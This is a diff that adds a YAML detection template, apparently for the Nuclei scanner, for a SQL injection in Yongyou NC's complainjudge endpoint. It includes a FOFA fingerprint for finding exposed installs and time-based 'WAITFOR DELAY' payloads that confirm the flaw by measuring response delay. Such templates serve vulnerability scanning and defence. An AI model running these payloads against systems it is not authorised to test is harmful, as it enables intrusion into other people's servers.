@@ -1,0 +1,69 @@
+id: poc-yaml-yongyou-complainjudge-sqli
+info:
+  name: Yongyou NC complainjudge SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 'Yongyou NC'
+    fofa: 'app="用友-UFIDA-NC"'
+variables:
+  t1: "{{rand_int(5,9)}}"
+  t2: "{{to_number(t1) + 3}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3) + 3}}"
+flow: http(1) && (http(2) || http(3))
+http:
+  - id: check-method-not-allowed
+    method: GET
+    path:
+      - "{{BaseURL}}/ebvp/advorappcoll/complainjudge"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 405
+      - type: word
+        part: header
+        words:
+          - "Method Not Allowed"
+  - id: time-based-sqli-test-1
+    method: POST
+    path:
+      - "{{BaseURL}}/ebvp/advorappcoll/complainjudge"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - "duration >= t1"
+          - "duration <= t2"
+      - type: word
+        part: header
+        words:
+          - "Path=/ebvp/"
+  - id: time-based-sqli-test-2
+    method: POST
+    path:
+      - "{{BaseURL}}/ebvp/advorappcoll/complainjudge"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:{{t3}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - "duration >= t3"
+          - "duration <= t4"
+      - type: word
+        part: header
+        words:
+          - "Path=/ebvp/"
